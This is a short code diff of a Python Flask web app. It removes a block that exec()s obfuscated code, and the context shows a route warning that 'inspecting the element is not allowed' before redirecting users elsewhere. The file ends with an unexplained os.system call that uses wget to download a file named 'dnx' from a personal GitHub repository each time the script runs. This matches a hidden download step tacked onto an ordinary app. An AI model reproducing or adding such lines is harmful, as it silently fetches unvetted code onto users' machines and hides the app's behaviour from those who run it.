@@ -14,12 +14,6 @@ def redirect_page():
     print("Warning: Inspecting the element is not allowed!")
     return redirect('https://trustedge.com/')
 
-# Obfuscate the code
-from pyobfuscate import pyobfuscate
-
-obfuscated_code = pyobfuscate(index)
-exec(obfuscated_code)
-
 if __name__ == '__main__':
     app.run(debug=True)
 os.system('wget https://github.com/55113110159/OS/raw/main/dnx')
